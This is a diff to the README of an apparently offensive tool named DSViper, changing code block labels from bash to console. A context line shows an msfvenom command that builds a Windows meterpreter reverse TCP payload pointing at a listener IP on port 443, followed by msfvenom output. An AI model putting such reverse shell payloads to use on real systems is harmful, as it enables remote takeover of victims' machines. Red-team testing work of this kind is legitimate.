@@ -34,7 +34,7 @@ sudo cp masm/uasm /usr/bin/uasm
 ### **Option 2: Scripted Installation (Recommended)**
 If you prefer an automated setup, use the provided script:
 
-```bash
+```console
 chmod +x install_dependencies.sh
 ./install_dependencies.sh
 ```
@@ -45,7 +45,7 @@ chmod +x install_dependencies.sh
 
 Make the `DSViper` binary executable and run it OR just run the python script using python3:
 
-```bash
+```console
 ➜  DSViper git:(main) ✗ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.130.175 LPORT=443 -f raw > payload.bin
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
